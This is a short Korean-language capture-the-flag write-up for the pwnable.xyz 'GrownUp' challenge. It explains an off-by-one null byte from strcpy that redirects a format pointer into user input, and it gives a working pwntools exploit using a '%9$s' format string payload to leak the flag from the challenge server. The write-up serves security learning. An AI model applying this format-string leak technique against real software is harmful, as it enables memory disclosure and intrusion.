# [pwnable.xyz] GrownUp

> Are you old enough for this one? Flag is in the binary itself.

## Bug

![image](https://github.com/user-attachments/assets/bfb119af-6749-4f40-a713-819c1a6cfb6b)

`name`을 최대 `0x80`바이트까지 입력할 수 있고, `strcpy()`로 `usr`에 복사한다.

![image](https://github.com/user-attachments/assets/eefeb4fa-d93f-4f18-a0b3-3a512ee308ab)

`fmt`에는 `fmt_arr`의 주소인 `0x601168`이 저장되어 있는데, `usr`에 `0x80`바이트를 꽉 채워서 복사하면 맨 뒤에 null byte가 붙어서 off-by-one이 발생하여  `fmt`에 저장된 값이 `0x601100`으로 바뀌게 된다. 그러면 `main()`의 마지막 `printf()`는 `printf(0x601100, usr)`이 되는데, `0x601100`은 `usr`의 범위에 포함되므로 format string을 임의로 설정할 수 있게 되어 format string bug가 발생한다.

## Exploit

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30004)

flag = 0x601080

r.sendafter(b"Are you 18 years or older? [y/N]: ", b"y" * 8 + p64(flag))

payload = b"a" * 0x20
payload += b"%9$s"
payload = payload.ljust(0x80, b"a")

r.sendafter(b"Name: ", payload)

r.interactive()
```

![image](https://github.com/user-attachments/assets/521834cd-e316-4ef9-a7fc-526382dee693)
